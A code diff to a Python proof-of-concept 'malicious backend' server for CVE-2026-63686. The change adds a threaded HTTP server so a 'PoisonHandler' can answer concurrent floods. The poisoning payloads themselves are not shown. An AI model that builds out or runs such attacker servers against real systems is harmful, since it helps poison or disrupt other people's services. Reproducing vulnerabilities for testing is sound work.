@@ -20,9 +20,15 @@ Payload variants (access via path):
 """
 
 import http.server
+import socketserver
 import argparse
 import sys
 from datetime import datetime
+
+
+class ThreadedHTTPServer(socketserver.ThreadingMixIn, http.server.HTTPServer):
+    """Handle each request in a new thread so concurrent floods don't queue."""
+    daemon_threads = True
 
 
 # ──────────────────────────────────────────────────────────
@@ -110,7 +116,7 @@ def main():
     parser.add_argument("--bind", default="0.0.0.0", help="Bind address (default: 0.0.0.0)")
     args = parser.parse_args()
 
-    server = http.server.HTTPServer((args.bind, args.port), PoisonHandler)
+    server = ThreadedHTTPServer((args.bind, args.port), PoisonHandler)
     print("=" * 60)
     print("  CVE-2026-63686 — Malicious Backend (Attacker)")
     print("=" * 60)
